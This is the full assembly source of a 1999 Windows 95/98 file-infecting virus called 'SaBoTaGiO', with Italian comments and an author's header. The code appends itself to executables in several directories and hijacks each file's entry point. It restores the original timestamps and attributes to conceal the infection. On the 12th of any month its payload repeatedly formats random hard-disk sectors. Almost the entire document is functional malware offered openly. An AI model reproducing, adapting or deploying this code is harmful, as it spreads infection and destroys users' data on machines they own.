;    Name            : SaBoTaGiO
;    Author          : Techno Knight
;    Testing         : Techno Knight/DNA
;    Release Date    : 18 May 1999
;    Origin          : Italy/Europe
;    OS              : Windows 95/98
;    Encrypted       : No
;    Polimorphic     : No
;    Resident        : No                       
;    Infect          : PE Files
;    Payload         : On 12 of any month it format random sectors of
;                      the Hard Disk, until someone stop it :)
;
;    Notes           : It infects the first three PEs in the current
;                      directory, the first three in the Windows directory,
;                      the first three in the root directory, the first
;                      three in the a:\ directory (I hope it is a floppy)
;                      if it is in, then it infects from 0 to 5 directories
;                      When an already infected file or an invalid PE is
;                      found, it continues to search, until he has infected
;                      3 files (if there are at least other 3 files to
;                      infect). It has an internal list of 'unfriendly'
;                      files, such as EXPLORER.EXE. After infections it
;                      restores original date and attributes of infected
;                      files. It isn't encrypted (maybe for a future
;                      variant....) and it doesn't use any method to
;                      hide itself from antivirus, for the simple reason
;                      that antivirus don't recognize it :)
;                                                                         


.386p
.387
.model flat,STDCALL
locals        
jumps
                                 
lunghezza EQU  OFFSET Fine-OFFSET Via
                                
.DATA

db 0

.CODE

Via:


;;;;;;;;;;;;;;;;;;;;;;;;;;
;; CODICE VIRALE        ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;


        CALL    OttieniDelta

OttieniDelta:
        POP     EBP
        SUB     EBP,OFFSET OttieniDelta

; Vediamo se stiamo sotto win95 o win98...

        MOV     EAX,[EBP+OFFSET Kernel]
        CMP     dword ptr[EAX],5350FC9Ch
        JE      win95

win98:
        LEA     EAX,[EBP+OFFSET Via]
        MOV     ECX,lunghezza
        CALL    VirtualProtect98,EAX,ECX,4,0

        CMP     EBP,0
        JE      Capostipite98
                        

        MOV     EAX,dword ptr[EBP+OFFSET NewIP]
        MOV     dword ptr[EBP+OFFSET OldIP],EAX
        MOV     EAX,dword ptr[EBP+OFFSET NewImageBase]
        MOV     dword ptr[EBP+OFFSET OldImageBase],EAX

; Si segna la directory di partenza
                                                 
        LEA     EAX,[EBP+OFFSET StartDir]
        CALL    GetCurDir98,EAX,128h

                                            

; Si segna la directory di Windows
                                        
        LEA     EAX,[EBP+OFFSET WinDir]
        CALL    GetWinDir98,EAX,128h
                                        
                        
        CALL    Infetta98

        
; Va nella directory di Windows

        LEA     EAX,[EBP+OFFSET WinDir]
        CALL    SetCurDir98,EAX

        CALL    Infetta98

        LEA     EAX,[EBP+OFFSET RootDir]
        CALL    SetCurDir98,EAX
                                
        CALL    Infetta98

        MOV     ECX,5
Casuale98:
        PUSH    ECX
        IN      AL,40h
        AND     AL,24
        ADD     AL,64             ; Un carattere alfabetico in AL
        MOV     [EBP+OFFSET DirMask+1],AL
        LEA     EAX,[EBP+OFFSET DirFindBuffer]
        LEA     EDX,[EBP+OFFSET DirMask]
        CALL    FindFirst98,EDX,EAX
        CMP     EAX,0
        JE      NonTrovata98
        LEA     EAX,[EBP+OFFSET DirFindBuffer.FileName]
        CALL    SetCurDir98,EAX
        
        CALL    Infetta98
NonTrovata98:
        POP     ECX
        LOOP    Casuale98



        LEA     EAX,[EBP+OFFSET ADir]
        CALL    SetCurDir98,EAX
                                
        CALL    Infetta98


                                   
        
; Torna nella directory di partenza

        LEA     EAX,[EBP+OFFSET StartDir]
        CALL    SetCurDir98,EAX


        LEA     EAX,[EBP+OFFSET TimeStruct]
        CALL    GetDate98,EAX
        CMP     word ptr[EBP+OFFSET day],12
        JNE     nopayload98

payload98:
        MOV     AH,6h
        MOV     AL,0
        MOV     DL,3

        IN      AL,40h
        MOV     CH,AL
        IN      AL,40h
        MOV     CL,AL
        IN      AL,40h
        MOV     DH,AL
        INT     13h
        JMP     payload


nopayload98:


        MOV     EAX,dword ptr[EBP+OFFSET OldIP]
        ADD     EAX,dword ptr[EBP+OFFSet OldImageBase]
        JMP     EAX
                                                        

Capostipite98:                                
        CALL    Infetta98
        CALL    ExitProcess98,0


        JMP     TrovatoOS

win95:                  

        LEA     EAX,[EBP+OFFSET Via]
        MOV     ECX,lunghezza
        CALL    VirtualProtect95,EAX,ECX,4,0


        CMP     EBP,0
        JE      Capostipite

        MOV     EAX,dword ptr[EBP+OFFSET NewIP]
        MOV     dword ptr[EBP+OFFSET OldIP],EAX
        MOV     EAX,dword ptr[EBP+OFFSET NewImageBase]
        MOV     dword ptr[EBP+OFFSET OldImageBase],EAX


; Si segna la directory di partenza
                                        
        LEA     EAX,[EBP+OFFSET StartDir]
        CALL    GetCurDir95,EAX,128h

                                            

; Si segna la directory di Windows
                                        
        LEA     EAX,[EBP+OFFSET WinDir]
        CALL    GetWinDir95,EAX,128h
                                        
                        
        CALL    Infetta95

        
; Va nella directory di Windows

        LEA     EAX,[EBP+OFFSET WinDir]
        CALL    SetCurDir95,EAX

        CALL    Infetta95

        LEA     EAX,[EBP+OFFSET RootDir]
        CALL    SetCurDir95,EAX
                                
        CALL    Infetta95

        MOV     ECX,5
Casuale:
        PUSH    ECX
        IN      AL,40h
        AND     AL,24
        ADD     AL,64             ; Un carattere alfabetico in AL
        MOV     [EBP+OFFSET DirMask+1],AL
        LEA     EAX,[EBP+OFFSET DirFindBuffer]
        LEA     EDX,[EBP+OFFSET DirMask]
        CALL    FindFirst95,EDX,EAX
        CMP     EAX,0
        JE      NonTrovata
        LEA     EAX,[EBP+OFFSET DirFindBuffer.FileName]
        CALL    SetCurDir95,EAX
        
        CALL    Infetta95
NonTrovata:
        POP     ECX
        LOOP    Casuale



        LEA     EAX,[EBP+OFFSET ADir]
        CALL    SetCurDir95,EAX
                                
        CALL    Infetta95


                                   
        
; Torna nella directory di partenza

        LEA     EAX,[EBP+OFFSET StartDir]
        CALL    SetCurDir95,EAX


        LEA     EAX,[EBP+OFFSET TimeStruct]
        CALL    GetDate95,EAX
        CMP     word ptr[EBP+OFFSET day],12
        JNE     nopayload

payload:

        MOV     AH,6h
        MOV     AL,0
        MOV     DL,3

        IN      AL,40h
        MOV     CH,AL
        IN      AL,40h
        MOV     CL,AL
        IN      AL,40h
        MOV     DH,AL
        INT     13h
        JMP     payload

nopayload:

        MOV     EAX,dword ptr[EBP+OFFSET OldIP]
        ADD     EAX,dword ptr[EBP+OFFSet OldImageBase]
        JMP     EAX
                                                        

Capostipite:                                
        CALL    Infetta95
        CALL    ExitProcess95,0
        
TrovatoOS:


                        



VirtualProtect95:
                
        PUSH    0BFF9CCFBh           
        JMP [EBP + OFFSET Kernel]

MapViewOfFile95:
        PUSH 0BFF7FBF4h
        JMP [EBP + OFFSET Kernel]


UnMapViewOfFile95:
        PUSH 0BFF81750h
        JMP [EBP + OFFSET Kernel]

CreateFileMapping95:
        PUSH 0BFF773FDh
        JMP [EBP + OFFSET Kernel]

CloseHandle95:
        PUSH 0BFF7BC72h
        JMP [EBP + OFFSET Kernel]


SetEndOfFile95:
        PUSH 0BFF990FEh
        JMP [EBP + OFFSET Kernel]


SetFilePointer95:
        PUSH 0BFF76FA0h
        JMP [EBP + OFFSET Kernel]
                

GetFileSize95:
        PUSH 0BFF76E60h
        JMP [EBP + OFFSET Kernel]

GetFileAttributes95:
        PUSH 0BFF7786Ch
        JMP [EBP + OFFSET Kernel]

SetFileAttributes95:
        PUSH 0BFF7784Ch
        JMP [EBP + OFFSET Kernel]

GetFileTime95:
        PUSH 0BFF76FC1h
        JMP [EBP + OFFSET Kernel]

SetFileTime95:
        PUSH 0BFF77000h
        JMP [EBP + OFFSET Kernel]
                        

ExitProcess95:
        PUSH 0BFF8AFB0h
        JMP [EBP + OFFSET Kernel]
                        

GetCurDir95:
        PUSH 0BFF77744h            
        JMP [EBP + OFFSET Kernel]

SetCurDir95:
        PUSH 0BFF7771Dh            
        JMP [EBP + OFFSET Kernel]

GetWinDir95:
        PUSH 0BFF776E4h            
        JMP [EBP + OFFSET Kernel]
                

FindFirst95:
        PUSH 0BFF77893h   
        JMP [EBP + OFFSET Kernel]
        
FindNext95:
        PUSH 0BFF778CBh   
        JMP [EBP + OFFSET Kernel]

CreateFile95:
        PUSH 0BFF77817h   
        JMP [EBP + OFFSET Kernel]

MsgBox95:                 
        PUSH 0BFF638D9h
        JMP [EBP + OFFSET Kernel]

GetDate95:
        PUSH 0BFF9D14Eh
        JMP [EBP + OFFSET Kernel]



                
VirtualProtect98:
                        
        PUSH 0BFFA05FAh           
        JMP [EBP + OFFSET Kernel98]
                                
MapViewOfFile98:
        PUSH 0BFF82097h
        JMP [EBP + OFFSET Kernel98]


UnMapViewOfFile98:
        PUSH 0BFF83D37h
        JMP [EBP + OFFSET Kernel98]

CreateFileMapping98:
        PUSH 0BFF7769Eh
        JMP [EBP + OFFSET Kernel98]

CloseHandle98:
        PUSH 0BFF7E064h
        JMP [EBP + OFFSET Kernel98]

                                
SetEndOfFile98:
        PUSH 0BFF9C3A0h
        JMP [EBP + OFFSET Kernel98]


SetFilePointer98:
        PUSH 0BFF7713Fh
        JMP [EBP + OFFSET Kernel98]
                

GetFileSize98:
        PUSH 0BFF76FB5h
        JMP [EBP + OFFSET Kernel98]

GetFileAttributes98:
        PUSH 0BFF77B34h
        JMP [EBP + OFFSET Kernel98]

SetFileAttributes98:
        PUSH 0BFF77B14h
        JMP [EBP + OFFSET Kernel98]

GetFileTime98:
        PUSH 0BFF77160h
        JMP [EBP + OFFSET Kernel98]

SetFileTime98:
        PUSH 0BFF7719Fh
        JMP [EBP + OFFSET Kernel98]
                        

ExitProcess98:
        PUSH 0BFF8D4CAh
        JMP [EBP + OFFSET Kernel98]
                        

GetCurDir98:
        PUSH 0BFF779D9h            
        JMP [EBP + OFFSET Kernel98]

SetCurDir98:
        PUSH 0BFF779B2h            
        JMP [EBP + OFFSET Kernel98]

GetWinDir98:
        PUSH 0BFF7797Ch            
        JMP [EBP + OFFSET Kernel98]
                

FindFirst98:
        PUSH 0BFF77B5Bh   
        JMP [EBP + OFFSET Kernel98]
        
FindNext98:
        PUSH 0BFF77B93h   
        JMP [EBP + OFFSET Kernel98]

CreateFile98:
        PUSH 0BFF77ADFh   
        JMP [EBP + OFFSET Kernel98]

       
GetDate98:
        PUSH 0BFF77D0Bh
        JMP [EBP + OFFSET Kernel98]




Infetta95         PROC

                                                                                        
        MOV     byte ptr[EBP+OFFSET Infections],2

        LEA     EAX,[EBP+OFFSET FindBuffer]
        LEA     EDX,[EBP+OFFSET ExeMask]
        CALL    FindFirst95,EDX,EAX
        MOV     dword ptr[EBP+OFFSET FindHandle],EAX
                        

Apri:
        CMP     EAX,0
        JNE     OkFile

Basta:
        RET
OkFile:


        LEA     ESI,[EBP+OFFSET DontInfect1]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect1Size]
        REP     CMPSB
        JE      UnMap

        LEA     ESI,[EBP+OFFSET DontInfect2]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect2Size]
        REP     CMPSB                           
        JE      UnMap

        LEA     ESI,[EBP+OFFSET DontInfect3]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect3Size]
        REP     CMPSB
        JE      UnMap
                                        
        LEA     ESI,[EBP+OFFSET DontInfect4]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect4Size]
        REP     CMPSB
        JE      UnMap                           
                                                
                                        
                                                                                                      

; Salva gli attributi originali del file

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    GetFileAttributes95,EAX
        MOV     dword ptr[EBP+OFFSET OldAttributes],EAX
                                

; Setta i nuovi attributi per poterci scrivere sopra

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    SetFileAttributes95,EAX,20h
                                

; Apre il file

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    CreateFile95,EAX,80000000h+40000000h,1,0,3,0,0
        MOV     dword ptr[EBP+OFFSET FileHandle],EAX
                                      
; Salva la dimensione del file
                        
        CALL    GetFileSize95,dword ptr[EBP+OFFSET FileHandle],0
        MOV     dword ptr[EBP+OFFSET NewFileSize],EAX


; Calcola la memoria necessaria per mappare il file

        
        ADD     EAX,lunghezza
        ADD     EAX,1000h
        MOV     dword ptr[EBP+OFFSET Memory],EAX
        

; Salva la data originale del file

        LEA     EAX,[EBP+OFFSET Time1]
        LEA     ECX,[EBP+OFFSET Time2]
        LEA     EDX,[EBP+OFFSET Time3]
        CALL    GetFileTime95,dword ptr[EBP+OFFSET FileHandle],EAX,ECX,EDX
                        

                                                       

; Mappa il file

Map:                            
        CALL    CreateFileMapping95,dword ptr[EBP+OFFSET FileHandle],0,4,0,dword ptr[EBP+OFFSET Memory],0
        MOV     dword ptr[EBP+OFFSET MapHandle],EAX
        CALL    MapViewOfFile95,dword ptr[EBP+OFFSET MapHandle],2,0,0,dword ptr[EBP+OFFSET Memory]
        MOV     dword ptr[EBP+OFFSET MapAddress],EAX

        MOV     ESI,EAX

; Controlla se Š un EXE

        INC     byte ptr[EBP+OFFSET Infections]
        CMP     word ptr[ESI],'ZM'
        JNE     UnMap
        DEC     byte ptr[EBP+OFFSET Infections]

; Controlla se Š gi… infetto

        INC     byte ptr[EBP+OFFSET Infections]
        CMP     word ptr[ESI+38h],'KT'
        JE      UnMap
        DEC     byte ptr[EBP+OFFSET Infections]


; Controlla se Š un EXE di Windows 9x

        MOV     EBX,dword ptr[ESI+3ch]
        INC     byte ptr[EBP+OFFSET Infections]
        CMP     word ptr[ESI+EBX],'EP'
        JNE     UnMap
        DEC     byte ptr[EBP+OFFSET Infections]

        MOV     word ptr[ESI+38h],'KT'


; Si sposta all'inizio del PE Header

        ADD     ESI,EBX
        MOV     dword ptr[EBP+OFFSET PEStart],ESI

; Salva l'IP originale del file

        MOV     EAX,[ESI+28h]
        MOV     dword ptr[EBP+OFFSET NewIP],EAX


; Salva l'Image Base originale del file

        MOV     EAX,[ESI+52]
        MOV     dword ptr[EBP+OFFSET NewImageBase],EAX
                                        
                        
; Salva il File Align

        MOV     EAX,[ESI+3Ch]
        MOV     dword ptr[EBP+OFFSET FileAlign],EAX


; Salva il Section Align

        MOV     EAX,[ESI+38h]
        MOV     dword ptr[EBP+OFFSET SectionAlign],EAX


; Salva l'Image Size

        MOV     EAX,[ESI+80]
        MOV     dword ptr[EBP+OFFSET ImageSize],EAX



                                                        
; Si sposta alla fine della Object Table (primo spazio vuoto)

        MOV     EBX,[ESI+74h]
        SHL     EBX,3
        XOR     EAX,EAX
        MOV     AX,word ptr[ESI+6]
        MOV     ECX,28h
        MUL     ECX
        ADD     ESI,78h
        ADD     ESI,EBX
        ADD     ESI,EAX

        LEA     EDI,[EBP+OFFSET NewObject]
        XCHG    EDI,ESI

; Calcola l'RVA del nostro nuovo oggetto

        MOV     EAX,[EDI-40+8]
        ADD     EAX,[EDI-40+12]
        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET RVA],EAX

; Calcola la Physical Size

        MOV     ECX,dword ptr[EBP+OFFSET FileAlign]
        MOV     EAX,lunghezza
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET PhysicalSize],EAX

; Calcola la Virtual Size

        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
        MOV     EAX,lunghezza+1000h
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET VirtualSize],EAX

; Calcola il Physical Offset

        MOV     EAX,[EDI-40+20]
        ADD     EAX,[EDI-40+16]
        MOV     ECX,dword ptr[EBP+OFFSET FileAlign]
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET PhysicalOffset],EAX

        MOV     dword ptr[EBP+OFFSET NewFileSize],EAX
        ADD     dword ptr[EBP+OFFSET NewFileSize],lunghezza
                                                        


; Scrive il nuovo oggetto

        MOV     ECX,10
        REP     MOVSD

                                        
                                                        
       

; Scrive il virus

        MOV     EDI,dword ptr[EBP+OFFSET MapAddress]
        ADD     EDI,dword ptr[EBP+OFFSET PhysicalOffset]
        LEA     ESI,[EBP+OFFSET Via]
        MOV     ECX,lunghezza
        CLD
        REP     MOVSB


; Aggiunge 1 al numero degli oggetti

        MOV     ESI,dword ptr[EBP+OFFSET PEStart]
        INC     word ptr[ESI+6]


; Mette l'RVA del nuovo oggetto come Entrypoint

        MOV     EAX,dword ptr[EBP+OFFSET RVA]
        MOV     [ESI+28h],EAX



; Aggiorna l'Image Size

        MOV     EAX,lunghezza+1000h
        ADD     EAX,dword ptr[EBP+OFFSET ImageSize]
        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET ImageSize],EAX
        MOV     [ESI+80],EAX



; Smappa il file
        
UnMap:
                        
        CALL    UnMapViewOfFile95,dword ptr[EBP+OFFSET MapAddress]
        CALL    CloseHandle95,dword ptr[EBP+OFFSET MapHandle]
        

; Setta il nuovo End Of File

NuovoEOF:
                                
        CALL    SetFilePointer95,dword ptr[EBP+OFFSET FileHandle],dword ptr[EBP+OFFSET NewFileSize],0,0
        CALL    SetEndOfFile95,dword ptr[EBP+OFFSET FileHandle]
                                                
                 
Chiudi:

                                                                                        
; Ripristina la data originale del file

        LEA     EAX,[EBP+OFFSET Time1]
        LEA     ECX,[EBP+OFFSET Time2]
        LEA     EDX,[EBP+OFFSET Time3]
        CALL    SetFileTime95,dword ptr[EBP+OFFSET FileHandle],EAX,ECX,EDX
                        

; Chiude l'handle del file

        CALL    CloseHandle95,dword ptr[EBP+OFFSET FileHandle]
                        

; Ripristina gli attributi originali del file

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    SetFileAttributes95,EAX,dword ptr[EBP+OFFSET OldAttributes]
                                
        CMP     byte ptr[EBP+OFFSET Infections],0
        JE      Finito
        DEC     byte ptr[EBP+OFFSET Infections]
        LEA     EAX,[EBP+OFFSET FindBuffer]
        CALL    FindNext95,dword ptr[EBP+OFFSET FindHandle],EAX
        JMP     Apri                                                                            
                        
                        

                                
Finito:

RET

Infetta95         ENDP
                
Infetta98         PROC

                                                                                        
        MOV     byte ptr[EBP+OFFSET Infections],2

        LEA     EAX,[EBP+OFFSET FindBuffer]
        LEA     EDX,[EBP+OFFSET ExeMask]
        CALL    FindFirst98,EDX,EAX
        MOV     dword ptr[EBP+OFFSET FindHandle],EAX
                                     

Apri98:
        CMP     EAX,0
        JNE     OkFile98
                        
Basta98:
        RET
OkFile98:


        LEA     ESI,[EBP+OFFSET DontInfect1]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect1Size]
        REP     CMPSB
        JE      UnMap98
                        
        LEA     ESI,[EBP+OFFSET DontInfect2]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect2Size]
        REP     CMPSB                           
        JE      UnMap98

        LEA     ESI,[EBP+OFFSET DontInfect3]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect3Size]
        REP     CMPSB
        JE      UnMap98
                                        
        LEA     ESI,[EBP+OFFSET DontInfect4]
        LEA     EDI,[EBP+OFFSET FindBuffer.FileName]
        MOV     ECX,dword ptr[EBP+OFFSET DontInfect4Size]
        REP     CMPSB
        JE      UnMap98                           
                                                       
                                                                                                      

; Salva gli attributi originali del file

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    GetFileAttributes98,EAX
        MOV     dword ptr[EBP+OFFSET OldAttributes],EAX
                                

; Setta i nuovi attributi per poterci scrivere sopra

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    SetFileAttributes98,EAX,20h
                                

; Apre il file

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    CreateFile98,EAX,80000000h+40000000h,1,0,3,0,0
        MOV     dword ptr[EBP+OFFSET FileHandle],EAX
                                      
; Salva la dimensione del file
                        
        CALL    GetFileSize98,dword ptr[EBP+OFFSET FileHandle],0
        MOV     dword ptr[EBP+OFFSET NewFileSize],EAX


; Calcola la memoria necessaria per mappare il file

        
        ADD     EAX,lunghezza
        ADD     EAX,1000h
        MOV     dword ptr[EBP+OFFSET Memory],EAX
        

; Salva la data originale del file

        LEA     EAX,[EBP+OFFSET Time1]
        LEA     ECX,[EBP+OFFSET Time2]
        LEA     EDX,[EBP+OFFSET Time3]
        CALL    GetFileTime98,dword ptr[EBP+OFFSET FileHandle],EAX,ECX,EDX
                        

                                                       

; Mappa il file

Map98:                            
        CALL    CreateFileMapping98,dword ptr[EBP+OFFSET FileHandle],0,4,0,dword ptr[EBP+OFFSET Memory],0
        MOV     dword ptr[EBP+OFFSET MapHandle],EAX
        CALL    MapViewOfFile98,dword ptr[EBP+OFFSET MapHandle],2,0,0,dword ptr[EBP+OFFSET Memory]
        MOV     dword ptr[EBP+OFFSET MapAddress],EAX

        MOV     ESI,EAX

; Controlla se Š un EXE

        INC     byte ptr[EBP+OFFSET Infections]
        CMP     word ptr[ESI],'ZM'
        JNE     UnMap98
        DEC     byte ptr[EBP+OFFSET Infections]
                        
; Controlla se Š gi… infetto

        INC     byte ptr[EBP+OFFSET Infections]
        CMP     word ptr[ESI+38h],'KT'
        JE      UnMap98
        DEC     byte ptr[EBP+OFFSET Infections]
                        

; Controlla se Š un EXE di Windows 9x

        MOV     EBX,dword ptr[ESI+3ch]
        INC     byte ptr[EBP+OFFSET Infections]
        CMP     word ptr[ESI+EBX],'EP'
        JNE     UnMap98
        DEC     byte ptr[EBP+OFFSET Infections]
                        
        MOV     word ptr[ESI+38h],'KT'


; Si sposta all'inizio del PE Header

        ADD     ESI,EBX
        MOV     dword ptr[EBP+OFFSET PEStart],ESI

; Salva l'IP originale del file

        MOV     EAX,[ESI+28h]
        MOV     dword ptr[EBP+OFFSET NewIP],EAX


; Salva l'Image Base originale del file

        MOV     EAX,[ESI+52]
        MOV     dword ptr[EBP+OFFSET NewImageBase],EAX
                                        
                        
; Salva il File Align

        MOV     EAX,[ESI+3Ch]
        MOV     dword ptr[EBP+OFFSET FileAlign],EAX


; Salva il Section Align

        MOV     EAX,[ESI+38h]
        MOV     dword ptr[EBP+OFFSET SectionAlign],EAX


; Salva l'Image Size

        MOV     EAX,[ESI+80]
        MOV     dword ptr[EBP+OFFSET ImageSize],EAX



                                                        
; Si sposta alla fine della Object Table (primo spazio vuoto)

        MOV     EBX,[ESI+74h]
        SHL     EBX,3
        XOR     EAX,EAX
        MOV     AX,word ptr[ESI+6]
        MOV     ECX,28h
        MUL     ECX
        ADD     ESI,78h
        ADD     ESI,EBX
        ADD     ESI,EAX

        LEA     EDI,[EBP+OFFSET NewObject]
        XCHG    EDI,ESI

; Calcola l'RVA del nostro nuovo oggetto

        MOV     EAX,[EDI-40+8]
        ADD     EAX,[EDI-40+12]
        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET RVA],EAX

; Calcola la Physical Size

        MOV     ECX,dword ptr[EBP+OFFSET FileAlign]
        MOV     EAX,lunghezza
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET PhysicalSize],EAX

; Calcola la Virtual Size

        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
        MOV     EAX,lunghezza+1000h
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET VirtualSize],EAX

; Calcola il Physical Offset

        MOV     EAX,[EDI-40+20]
        ADD     EAX,[EDI-40+16]
        MOV     ECX,dword ptr[EBP+OFFSET FileAlign]
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET PhysicalOffset],EAX

        MOV     dword ptr[EBP+OFFSET NewFileSize],EAX
        ADD     dword ptr[EBP+OFFSET NewFileSize],lunghezza
                                                        


; Scrive il nuovo oggetto

        MOV     ECX,10
        REP     MOVSD

                                        
                                                        
       

; Scrive il virus

        MOV     EDI,dword ptr[EBP+OFFSET MapAddress]
        ADD     EDI,dword ptr[EBP+OFFSET PhysicalOffset]
        LEA     ESI,[EBP+OFFSET Via]
        MOV     ECX,lunghezza
        CLD
        REP     MOVSB


; Aggiunge 1 al numero degli oggetti

        MOV     ESI,dword ptr[EBP+OFFSET PEStart]
        INC     word ptr[ESI+6]


; Mette l'RVA del nuovo oggetto come Entrypoint

        MOV     EAX,dword ptr[EBP+OFFSET RVA]
        MOV     [ESI+28h],EAX



; Aggiorna l'Image Size

        MOV     EAX,lunghezza+1000h
        ADD     EAX,dword ptr[EBP+OFFSET ImageSize]
        MOV     ECX,dword ptr[EBP+OFFSET SectionAlign]
        XOR     EDX,EDX
        DIV     ECX
        INC     EAX
        MUL     ECX
        MOV     dword ptr[EBP+OFFSET ImageSize],EAX
        MOV     [ESI+80],EAX



; Smappa il file
        
UnMap98:
                        
        CALL    UnMapViewOfFile98,dword ptr[EBP+OFFSET MapAddress]
        CALL    CloseHandle98,dword ptr[EBP+OFFSET MapHandle]
        

; Setta il nuovo End Of File

NuovoEOF98:
                                
        CALL    SetFilePointer98,dword ptr[EBP+OFFSET FileHandle],dword ptr[EBP+OFFSET NewFileSize],0,0
        CALL    SetEndOfFile98,dword ptr[EBP+OFFSET FileHandle]
                                                
                 
Chiudi98:

                                                                                        
; Ripristina la data originale del file

        LEA     EAX,[EBP+OFFSET Time1]
        LEA     ECX,[EBP+OFFSET Time2]
        LEA     EDX,[EBP+OFFSET Time3]
        CALL    SetFileTime98,dword ptr[EBP+OFFSET FileHandle],EAX,ECX,EDX
                        

; Chiude l'handle del file

        CALL    CloseHandle98,dword ptr[EBP+OFFSET FileHandle]
                        

; Ripristina gli attributi originali del file

        LEA     EAX,[EBP+OFFSET FindBuffer.FileName]
        CALL    SetFileAttributes98,EAX,dword ptr[EBP+OFFSET OldAttributes]
                                
        CMP     byte ptr[EBP+OFFSET Infections],0
        JE      Finito98
        DEC     byte ptr[EBP+OFFSET Infections]
        LEA     EAX,[EBP+OFFSET FindBuffer]
        CALL    FindNext98,dword ptr[EBP+OFFSET FindHandle],EAX
        JMP     Apri98                                                                            
                        
                                      

                                
Finito98:

RET

Infetta98         ENDP


Variabili:
        
Kernel98        DD 0BFF956ABh
Kernel          DD 0BFF93C1dh
Quale           DB ?
ExeMask         DB '*.EXE',0
DirMask         DB '* *. ',0                

FileTime        STRUC

        FT_dwLowDateTime  DD ?
        FT_dwHighDateTime DD ?

FileTime        ENDS
                        

        
FileBuffer      STRUC

        FileAttributes     DD       ?
        CreationTime       FileTime ?
        LastAccessTime     FileTime ?
        LastWriteTime      FileTime ?
        FileSizeHigh       DD       ?
        FileSizeLow        DD       ?
        Reserved0          DD       ?
        Reserved1          DD       ?
        FileName           DB 260 dup (?)
        AlternateFileName  DB 13  dup (?)
                           DB 3   dup (?)

FileBuffer      ENDS

TimeStruct:
dw 0,0,0
day dw 0
dw 0,0,0,0


FindBuffer   FileBuffer      ?
DirFindBuffer FileBuffer      ?


NewObject:
OName           DB '.TechnoK'
VirtualSize     DD 0
RVA             DD 0
PhysicalSize    DD 0
PhysicalOffset  DD 0
Reserved        DD 0,0,0
Flags           DB 40h,0,0,0C0h


FindHandle      DD      ?
FileHandle      DD      ?
MapHandle       DD      ?
MapAddress      DD      ?
                        
Infections      DB      0

OldAttributes   DD      0
Time1           DQ      0
Time2           DQ      0
Time3           DQ      0
                
Memory          DD      0
NewFileSize     DD      ?
NewImageSize    DD      ?
PEStart         DD      ?
NewIP           DD      ?
OldIP           DD      ?
FileAlign       DD      ?
SectionAlign    DD      ?
ImageSize       DD      ?
NewImageBase    DD      ?
OldImageBase    DD      ?
                                                                                                                                                                   
Message         DB      'ViruS "SABOTAGIO" CrEaTed by Techno Knight '
                                                                                                                
StartDir        DB      128h    DUP(?)
WinDir          DB      128h    DUP(?)
RootDir         DB      'c:\\',0
ADir            DB      'a:\\',0
                
DontInfect1     DB      'WININIT.exe'
DontInfect1Size DD      OFFSET DontInfect1Size-OFFSET DontInfect1
DontInfect2     DB      'EXPLORER.exe'
DontInfect2Size DD      OFFSET DontInfect2Size-OFFSET DontInfect2
DontInfect3     DB      'DOSREP.exe'
DontInfect3Size DD      OFFSET DontInfect3Size-OFFSET DontInfect3
DontInfect4     DB      'TASKMON.exe'
DontInfect4Size DD      OFFSET DontInfect4Size-OFFSET DontInfect4
                                                                                                                                                                 
                        


Fine:
end Via
end
